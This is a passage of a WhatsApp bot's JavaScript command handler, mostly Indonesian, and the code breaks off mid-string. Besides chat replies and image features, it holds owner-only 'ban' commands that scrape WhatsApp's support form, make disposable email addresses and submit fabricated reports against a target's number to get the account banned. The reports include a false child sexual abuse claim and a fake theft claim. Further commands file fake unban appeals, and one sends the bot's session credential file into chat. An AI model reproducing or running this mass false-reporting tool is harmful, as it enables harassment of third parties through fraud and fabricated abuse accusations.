if (global.keyopenai === '') return replygcTzy("Apikey limit exceeded");
if (!q) return replygcTzy(`Generate image from AI.\n\nExample:\n${prefix + command} man riding horse`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
//console.log(response.data.data[0].url)
yudamods.sendImage(from, response.data.data[0].url, text, m);
} catch (err) {
console.log(err);
replygcTzy("Sorry, there seems to be an error :"+ err);
}
break
case 'shutdown':
if (!TzyTheCreator) return replygcTzy(mess.owner)
replygcTzy(`Ba bye...`)
await sleep(3000)
process.exit()
break
case 'owner': {
const repf = await yudamods.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
yudamods.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
}
break
case 'yt':
case 'youtube':
	yudamods.sendMessage(from, 
{text: `Jangan Lupa Subscribe Yt gwa🗿👍🏻
*Link* : https://www.youtube.com/@YUDAMODS`},
{quoted: m})
        break
        case 'oke':
case 'okey':
	yudamods.sendMessage(from, 
{text: `katakan otey🗿`},
{quoted: m})
        break
        case '🗿':
case 'njr':
	yudamods.sendMessage(from, 
{text: `vn ara-ara kak`},
{quoted: m})
        break
        case 'gak':
case 'nanti':
case 'ntar':
	yudamods.sendMessage(from, 
{text: `ayoklah kak🤧`},
{quoted: m})
        break
        case 'ydh':
case 'iya':
case 'ok':
	yudamods.sendMessage(from, 
{text: `afah ingyah?`},
{quoted: m})
        break
        case 'jomblo':
	yudamods.sendMessage(from, 
{text: `gw jomblo yah?`},
{quoted: m})
        break
        case 'nt':
        case 'sad':
	yudamods.sendMessage(from, 
{text: `vn ara-ara aja kak🥹`},
{quoted: m})
        break
        case 'hay':
        case 'hy':
        case 'hi':
	yudamods.sendMessage(from, 
{text: `hay juga tayanggg😍`},
{quoted: m})
        break   
        case 'assalamualaikum':
        case 'p':
	yudamods.sendMessage(from, 
{text: `walaikumsalam`},
{quoted: m})
        break
        case 'tohd':
case 'removebg': {

const alias = {
    "tohd" : "torch-srgan",
    "removebg" : "removebg"
  };
  const aliasCommand = alias[command] || command;
  if (`${global.wtf}` == 'SanzV7') {
    return m.reply(global.noapikey);
  }

  if (!/video/.test(mime) && !/image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  let error;
try {
  let media = await yudamods.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    m.reply(global.wait);

    const response = `https://xzn.wtf/api/${aliasCommand}?url=${anu}&apikey=kikyy`

    yudamods.sendMessage(from, { image: { url: response }, caption: 'nih' }, { quoted: m });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						m.reply("Proses Gagal :(");
					}
					}
					}
break
        
        case 'remini': {
            if (isMedia) {
                    const media = await yudamods.downloadAndSaveMediaMessage(quoted)
                    const anu = await TelegraPh(media)
                    await 
                    yudamods.sendMessage(m.chat, { image: { url: `https://api.itsrose.site/image/unblur?url=${anu}&apikey=yudamods` }, caption: `Sukses membuat hd` }, { quoted: m })
                } else {
                reply('Reply gambar nya bang')
                }
            }
            break
        case 'jadianime': 
case 'toanime': {
if (`${global.wtf}` == 'SanzV7') return m.reply(global.noapikey)

if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let media = await yudamods.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(global.wait)
  let response = `https://xzn.wtf/api/toanime?url=${util.format(anu)}&apikey=${global.wtf}`

yudamods.sendMessage(from, { image: { url: response}, caption: command },{ quoted: m });
}
}
break
        case 'getsesi':
            if (!TzyTheCreator) return reply(mess.owner)
            reply('Tunggu Sebentar, Sedang mengambil file sesi mu')
            let sesi = await fs.readFileSync('./yudamods/creds.json')
            yudamods.sendMessage(m.chat, { document: sesi, mimetype: 'application/json', fileName: 'creds.json' }, { quoted: m })
        break
case 'banyudamods1': {
if (!TzyTheCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `I noticed that a user was using modified whatsapp, so i ask support to ban this account for violating terms of service, and the account uses a WhatsApp bot that can send malicious messages so that other users' WhatsApp cannot work
Number : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'banyudamods2': {
if (!TzyTheCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Buenas noches Ocupo que desactiven mi numero por asunto de robo/extraviado [+62 XXX-XXXX-XXXX] porque tiene datos muy personales mios, por asuntos de trabajo, y porque contiene cuentas com numeros de cuentas muy secretas Por favor desactiven el numero Buenas dias/noches, gracia : ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'banyudamods3': {
if (!TzyTheCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `I am a 9 year old woman I am still a student in elementary school!
There is someone unknown forcing me to have sex with me, and he has my photo to serve as a curse lineage.

Number: ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'banyudamods4': {
if (!TzyTheCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Pussy just plugged in by that person! My pussy hurts until now please block the number: ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanyudamods1': {
if (!TzyTheCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aku Tidak Tau Mengapa Nomor Saya Tiba Tiba Di Larang Dari Menggunakan WhatsApp Aku Hanya Membalas Pesan Customer Saya Mohon Buka Larangan Akun WhatsApp Saya: [+${targetnya}]
Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanyudamods2': {
if (!TzyTheCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Pihak WhatsApp yang terhormat mohon bantuan anda segera
[${targetnya}]
Saya telah mengirim beberapa email dan laporan ke pihak WhatsApp untuk mengajukan banding agar nomor saya cepat di buka dari daftar blokir, saya sangat membutuhkan untuk keperluan pribadi berkomunikasi dengan keluarga jika saya melakukan pelanggaran sebelumnya maka saya akan menggunakan nomor saya tersebut dengan lebih hati-hati dan lebih baik lagi dari sebelumnya dan saya sekarang telah menuruti apa yang pihak WhatsApp sarankan, dan saya sangat berharap sekarang juga nomor saya dapat di gunakan kembali. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanyudamods3': {
if (!TzyTheCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Good morning/afternoon/night WhatsApp parties!
